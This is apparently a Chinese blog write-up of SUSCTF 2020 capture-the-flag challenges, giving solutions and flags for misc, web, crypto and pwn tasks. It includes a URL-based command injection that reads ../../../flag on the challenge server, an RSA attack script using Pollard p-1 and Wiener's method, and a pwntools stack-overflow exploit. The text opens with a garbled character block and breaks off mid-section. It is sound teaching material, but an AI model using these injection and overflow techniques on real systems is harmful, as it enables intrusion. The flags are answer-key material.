1k:DDmktty1rrMp?yw3y3kmtpyd:maiwDN0nDOMMkDdy:watMkidu:D:Mi0w00aN:ku:1:a:npaNOD:MpwODaiaDu:dMoaDmayOmwwMtw:0DuM3u?:po0iN:adrt0up?ONiND?nNmtDdronmaOMinm0:miMDyddMpk?doMdi0pNOyoMMuiwt0m3at0uDuid0Nm0iiyi:uOONdiOr3tMpn:kri3kpomioMDmN1Oadaai3Mmwa10OrwriiON:0:uuiDkD?r:iynuMui0yiarMy:O:yMp?mdkDDo33ay:pMnanNDo3nkoiOapt:1MNkr0Di?0mkr0yy:NauatDao0aim0w3i:Op0aikwDmmuoimnyr:Nuo:p3no0yy3apauDua0w0mo0u?3Nup?mo:3NMDwNDtudyi3D:d1DmNaykn1MOMwo?OMpodna1D0:wm0kiDrr?o?ppuwu:tNykDpkpNttnunurd11ptwamrnm3k0a:i1pOpu0mMtua331Ou3OMaONkMaDrMptDO30yDrd1duooOuNODkNkNmi1N0MMiOadmymNnOkwM0MMDkMMMraa1dtwuoDd0a:wkm300O0ymD1w13:oDNayw0i0a0My130Oim0?0urro3OOMp3ukDaiiymnr</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">字频统计</a>发现,，按频率从高到底有：  <code>Mima:D0youkNOw3dpr1nt?</code>  </p>
</li>
<li><p>解压成功，获得sus文件，内有G代码，拿到<a href="http://nraynaud.github.io/webgcode">http://nraynaud.github.io/webgcode</a> 执行，Front面有flag，多找两个面放大即可看到被挡住的字符了<br><img src="/2020/10/20/SUS2020/3D.png" alt><br><code>SUS&#123;3D_Pr1nting_1s_Great&#125;</code>  </p>
</li>
</ol>
<h4 id="Misc-抓住那只小老鼠"><a href="#Misc-抓住那只小老鼠" class="headerlink" title="[Misc]抓住那只小老鼠"></a>[Misc]抓住那只小老鼠</h4><h5 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>用010Editor查看文件，发现尾部有提示：<br><code>D0 y0u Kn0wPseudo encryption?</code></p>
</li>
<li><p>故为zip伪加密，找到504b0102后加密标志位（除了里面包含的一个zip文件外）改为0000，可正常解压，得到keyboard.pcapng和这个小老鼠竟然是个右撇子.zip  </p>
</li>
<li>得到的zip仍为加密的，猜测密码应在keyboard.pcapng中  </li>
<li><a href="https://blog.csdn.net/qq_36609913/article/details/78578406">参考1</a><br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">参考2</a><br>从键盘流量中获取信息并导出到usbdata.txt：<code>tshark -r keyboard.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure>
<p><code>PASSWORD  L3T-U5-L00K-4T-TH3-R1GHT-BUTT0N</code><br>实际上应该为小写。。。。l3t-u5-l00k-4t-th3-r1ght-butt0n</p>
<ol>
<li>通过以上密码可直接解压第二个zip，分析mouse.pcapng数据，<code>tshark -r mouse.pcapng -T fields -e usb.capdata &gt; mousedata.txt</code>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;mousedata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line">    <span class="comment"># right button</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> :</span><br><span class="line">        <span class="built_in">print</span> posx , posy</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>
<p><code>python mouseexp.py &gt; xy.txt</code>得到坐标文本  </p>
<ol>
<li>gnuplot进入，然后<code>plot &quot;xy.txt&quot;</code>得到<br><img src="/2020/10/20/SUS2020/flag.png" alt>  </li>
<li>之前没注意到是右键，采到的左键数据镜像过来是fakeflag，淦。。  </li>
<li>搞错了，刚刚是左键数据，用右键重画一次，垂直镜像一下就能看到<br><img src="/2020/10/20/SUS2020/rotateTrueFlag.png" alt><br><code>SUS&#123;Hiahia_G0t_1t!&#125;</code></li>
</ol>
<h4 id="Misc-fix-fo"><a href="#Misc-fix-fo" class="headerlink" title="[Misc]fix_fo"></a>[Misc]fix_fo</h4><h5 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>将文件头60改成50即可正常解压  </li>
<li>得到文本<br><code>新佛曰：諸隸殿僧降殿吽殿諸陀摩隸僧缽薩殿願心殿薩殿咤伏殿聞莊摩咤殿諦殿如叻須降闍殿亦修我殿愍殿諸隸殿波如空殿如如囑囑殿</code>  </li>
<li>用<a href="http://hi.pcmoe.net/buddha.html">新佛曰</a>解密<br><code>SUS&#123;Ta1k_w1th_F0&#125;</code></li>
</ol>
<h4 id="Misc-你还好吗？"><a href="#Misc-你还好吗？" class="headerlink" title="[Misc]你还好吗？"></a>[Misc]你还好吗？</h4><h5 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>解压后发现密码被加密了，用<a href="https://www.splitbrain.org/services/ook">ook解密</a>得到<br><code>Ar3_y0u_OK??</code>  </li>
<li>用其解压Sus.7z得到png，根据提示知其高度不够导致crc校验过不了，用010editor打开，猜测差不多高就直接将高度改为0196就成功了（不行就CRC爆破）<br><img src="/2020/10/20/SUS2020/height.png" alt>  </li>
<li>打开得到flag<br><img src="/2020/10/20/SUS2020/auok.png" alt><br><code>SUS&#123;wuhu_y0u_f1nD_m3&#125;</code>  </li>
</ol>
<h4 id="Web-Sign-in"><a href="#Web-Sign-in" class="headerlink" title="[Web]Sign_in"></a>[Web]Sign_in</h4><h5 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>直接转到题目地址，有<br><img src="/2020/10/20/SUS2020/你知道请求头吗.png" alt>  </li>
<li>F12 - Network - CTRL R<br><img src="/2020/10/20/SUS2020/network.png" alt>  </li>
<li>点击susctf.com，Headers即可查看flag<br><img src="/2020/10/20/SUS2020/header.png" alt><br><code>SUSCTF&#123;752a426b72b98bf7eda6d5cc53174a5e&#125;</code></li>
</ol>
<h4 id="Web-Script-Kiddle"><a href="#Web-Script-Kiddle" class="headerlink" title="[Web]Script_Kiddle"></a>[Web]Script_Kiddle</h4><h5 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>右键查看源码发现按钮会生成1000以内随机数，且console会回显文本  </li>
<li>F12 - console  </li>
<li>一直“揍他！”就可以拿flag<br><img src="/2020/10/20/SUS2020/揍他.png" alt><br><code>SUSCTF&#123;4cded8ce3b7cdf6e8b44a030dfa15b27&#125;</code></li>
</ol>
<h4 id="Web-刀来！"><a href="#Web-刀来！" class="headerlink" title="[Web]刀来！"></a>[Web]刀来！</h4><h5 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>转到题目地址<br><img src="/2020/10/20/SUS2020/刀来.png" alt>  </li>
<li>可以直接执行命令所以<code>http://susctf.com:10005/?z33=system(%22ls%22);</code><br><img src="/2020/10/20/SUS2020/刀来ls.png" alt>  </li>
<li>全是文件，也cat不到flag，所以不停往上一级目录查看，直到<code>http://susctf.com:10005/?z33=system(%22ls%20../../../%22);</code><br><img src="/2020/10/20/SUS2020/三级目录.png" alt>  </li>
<li><code>http://susctf.com:10005/?z33=system(%22cat%20../../../flag%22);</code><br><img src="/2020/10/20/SUS2020/刀来cat.png" alt>  <blockquote>
<p>SUSCTF{f5f397a37b728d927576ae889b908d17}  </p>
</blockquote>
</li>
</ol>
<h4 id="Web-AT-Field"><a href="#Web-AT-Field" class="headerlink" title="[Web]AT_Field"></a>[Web]AT_Field</h4><h5 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>转到题目地址，输入框只允许2个字符，故F12修改长度为4  </li>
<li>输入flag，点击按钮发现不给flag，直接回车拿到了<br><code>SUSCTF&#123;b8442b229c248ab68061f4602e7e0649&#125;</code></li>
</ol>
<h4 id="Web-first-lesson"><a href="#Web-first-lesson" class="headerlink" title="[Web]first_lesson"></a>[Web]first_lesson</h4><h5 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>后回显  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z33 is feiwu</span><br><span class="line">rmb is shenxian</span><br><span class="line">use POST method to submit aa </span><br></pre></td></tr></table></figure>
</li>
<li><p>打开Fiddler，点击左下角开始capturing，刷新<code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>，双击新出现的结果<br><img src="/2020/10/20/SUS2020/fiddler.png" alt>  </p>
</li>
<li><p>复制get请求内容<br><img src="/2020/10/20/SUS2020/get.png" alt>  </p>
</li>
<li>POST数据，注意添加content-type，且&amp;用url编码<br><img src="/2020/10/20/SUS2020/post.png" alt>  </li>
<li>execute并查看结果  </li>
<li>解码<br><img src="/2020/10/20/SUS2020/decode.png" alt>  </li>
<li>在textview中查看<br><img src="/2020/10/20/SUS2020/whois.png" alt></li>
</ol>
<h4 id="Crypto-嘤语"><a href="#Crypto-嘤语" class="headerlink" title="[Crypto]嘤语"></a>[Crypto]嘤语</h4><h5 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>注意到后面两个月亮表情对应左右花括号，猜测最后一句话是flag的密文，同时花括号前面有六个字符，应该就是SUSCTF，看1和3字符重复，验证了猜想基本正确  </li>
<li>因为开着PyCharm就正好直接拿进来CTRL R做替换了，替换思路是：先将SUSCTF对应的表情替换掉，发现前面还有个<code>F***:</code>显然是对应”FLAG”，然后有”表情+F”的组合是”OF”，再对其他字符做填充，如CLASSICAL，CIPHER等，就可以逐渐恢复出flag了  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&quot;I😊⬜CRYPTOGRAPHY,⬜A⬜CLASSICAL⬜CIPHER⬜IS⬜A⬜TYPE⬜OF⬜CIPHER⬜THAT⬜😴AS⬜USE🙃⬜HISTORICALLY⬜😅UT⬜😊O😴⬜HAS⬜FALLE😊,⬜FOR⬜THE⬜😭OST⬜PART,⬜I😊TO⬜🙃ISUSE.⬜I😊⬜CO😊TRAST⬜TO⬜😭O🙃ER😊⬜CRYPTOGRAPHIC⬜ALGORITH😭S,⬜😭OST⬜CLASSICAL⬜CIPHERS⬜CA😊⬜😅E⬜PRACTICALLY⬜CO😭PUTE🙃⬜A😊🙃⬜SOL😮E🙃⬜😅Y⬜HA😊🙃.⬜HO😴E😮ER,⬜THEY⬜ARE⬜ALSO⬜USUALLY⬜😮ERY⬜SI😭PLE⬜TO⬜😅REA😷⬜😴ITH⬜😭O🙃ER😊⬜TECH😊OLOGY.⬜THE⬜TER😭⬜I😊CLU🙃ES⬜THE⬜SI😭PLE⬜SYSTE😭S⬜USE🙃⬜SI😊CE⬜GREE😷⬜A😊🙃⬜RO😭A😊⬜TI😭ES,⬜THE⬜ELA😅ORATE⬜RE😊AISSA😊CE⬜CIPHERS,⬜😴ORL🙃⬜😴AR⬜II⬜CRYPTOGRAPHY⬜SUCH⬜AS⬜THE⬜E😊IG😭A⬜😭ACHI😊E⬜A😊🙃⬜😅EYO😊🙃.⬜HERE⬜IS⬜YOUR⬜FLAG:⬜SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;.&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;</code></p>
<h4 id="Crypto-RSSA"><a href="#Crypto-RSSA" class="headerlink" title="[Crypto]RSSA"></a>[Crypto]RSSA</h4><h5 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>大数分解，拿去factor和yafu都解不出来，所以<a href="http://yulige.top/?p=752#childRSA213pt_38solvers">Pollard p-1</a>  </li>
<li>因为hint值太大了，这就意味着d2会很小，那么就是<a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener攻击</a>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> generalProject.rsa_wiener_attack.RSAwienerHacker <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">3060339854667248593045439268471563618105947041290938481437325848798323938532596377624638621097456963253037677560878331946238549090696901239603144752351327600586368201100237434726169753646811787604853964860726798254336863499145531199565109074254779876690101270258127715336168391612300304331101360275482233310674932139807609972793497538656646848415992324215456226007567101761161788925814705494294400067939912005412022042668218198383402940130898294895649777977189323224263157282092376424922614684186453440072575716268919964175691720756763119457242056477670177079759247122219232189306055203008434843682933286646266213545529</span></span><br><span class="line">c1 = <span class="number">3034469135294668773920507296346350907742457191809402478651651217514955247855057533285593352174358500799066186911877764529883001921082777805708529058571202933977282137208978346424554431043278549161483292409933547041813315975823969433401643242339079668276684778997460119485703198793575336626432882752487489338573038850368920863161207166964460908530752241974904789636070196624073568755921923220050851726340905458096183125781252224795386550130576788381853678417208871830497382705959067939298640356768911183934418681683145007224744048971106742284638285450915496700589787964160222024466744139469925581347695004377624495126915</span></span><br><span class="line">n2 = <span class="number">10807879892068351137882646909051489249635133849135554246405938629884200521475944531591568601618793402948721935425608627699981096326141738901035519331102707539920513581542001947790197240207566927971678513209908723244407016045630599048822569018427598397968961619045802981482548829222463503036924385721648266628299260991104729336073926580607199543174083380805549563817814412425939068641770601855910658492094090168370370854773061021846017875357170911444961167591295893582538961911101048500175084293595051999904087614747835111979609341806717723922618200228638905661136101116560894773115822777483505620089698306929561785323</span></span><br><span class="line">c2 = <span class="number">9683205078328252218032269702345643329971829786690479639266538047554486626818807182948959694083494415321749771694962705383395520313360833790060850924741844334210061457412714409510396570202504721712360741707661477563359914632426508418800225158732852097973890339230747236123801365622331935944566042700904386015421937836728697959613396426201564885786343062950855931133983926321168463148165960442802306229736368651402634294933332130289754301101314108768581240883792427050189942403534268596623333863094794374201347799653298070303061655891582667320043298218647231196611752237350024535657749266580570143793917557001539320495</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pollard_p_1</span>(<span class="params">N</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = a</span><br><span class="line">        <span class="comment"># precompute</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80000</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80000</span>, <span class="number">104729</span> + <span class="number">1</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">            <span class="keyword">if</span> n % <span class="number">15</span> == <span class="number">0</span>:</span><br><span class="line">                d = GCD(f - <span class="number">1</span>, N)</span><br><span class="line">                <span class="keyword">if</span> <span class="number">1</span> &lt; d &lt; N:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(Pollard_p_1(n1))</span></span><br><span class="line">p1 = <span class="number">23975730849019524224501133179102224796674075610246254128092570426422042826827752011251742168145817735504529147185472555701614948560936966981378192239399032009466320988235920811175788786979445565393611983841562134713850961292348331543316941450790337102298329241467860332089091772440405878425341499542277671695443</span></span><br><span class="line">q1 = n1 // p1</span><br><span class="line">d1 = invert(e1, (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(d1)</span></span><br><span class="line"><span class="comment"># d1 = 1290874390686504113800572548905624374916776782724975256433059733649402123331783485100866839214765709327051490890533906164789637167756002530899939477455484690947244496257304479081591111430374674711210201941039895188105776196200300051585789328908847443600121450707473374776889986080083458396462547926445074654616956992228117873470173124680591450377597400447728593106359737986839543880607109412876695735287787219432558567338918079968635213970201053049858159596886411010563653463432345037560562367605341086450175287814510703091118683130796239718226908370016179998972192219601416531060637529519864036298222311171029394100081</span></span><br><span class="line"></span><br><span class="line">hint = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="comment"># print(hint)</span></span><br><span class="line"><span class="comment"># hint = 6447619334753222352642437426429858393559157103132369271461053517398729066459898239876515174356275892746233257614418880902563829997140350674866683206108482180467602522894155668424194920123827480635464864103765289832500322877007095569898442461637065138702513583894277315133366039750740029708723131396176433739505095125300759881683959288494017209369857877787318788348783910350463678400192419123716822673269223216260659356722683659879902069300190507155060239407696896030102443235801007815882499003540957722284061124180164977533909072687907196264536660791464489256384351443110635373913931349991593387041785791002589247321</span></span><br><span class="line"></span><br><span class="line">d2 = hack_RSA(hint, n2)</span><br><span class="line"><span class="comment"># print(d2)</span></span><br><span class="line">d2 = <span class="number">233</span></span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;Sm0oTh_PQ_&amp;_Sma11_d&#125;</code></p>
<h4 id="Pwn-babync"><a href="#Pwn-babync" class="headerlink" title="[Pwn]babync"></a>[Pwn]babync</h4><h5 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>Ubuntn中<code>nc 146.56.223.95 20002</code>  </li>
<li><code>ls</code>然后<code>cat flag</code>即可</li>
</ol>
<h4 id="Pwn-babystack"><a href="#Pwn-babystack" class="headerlink" title="[Pwn]babystack"></a>[Pwn]babystack</h4><h5 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babystack</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Full RELRO  </span><br><span class="line">    Stack:    Canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
</li>
<li><p>IDA64打开，<code>main()</code>有  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello,I&#x27;m 1p0ch.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>) )</span><br><span class="line">    backdoor(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>所以，只要<code>s1=&quot;btis_wants_girlfriends&quot;</code>即可，查看栈信息<br><img src="/2020/10/20/SUS2020/babystackbuf.png" alt><br>只要填充<code>&#39;a&#39;*0x30</code>即可覆盖到s1，因此有exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20006</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">&quot;btis_wants_girlfriends&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="Pwn-babyrop"><a href="#Pwn-babyrop" class="headerlink" title="[Pwn]babyrop"></a>[Pwn]babyrop</h4><h5 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babyrop</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000) </span><br></pre></td></tr></table></figure>
</li>
<li><p>IDA64打开，直接F5，<code>main()</code>  </p>
</li>
</ol>
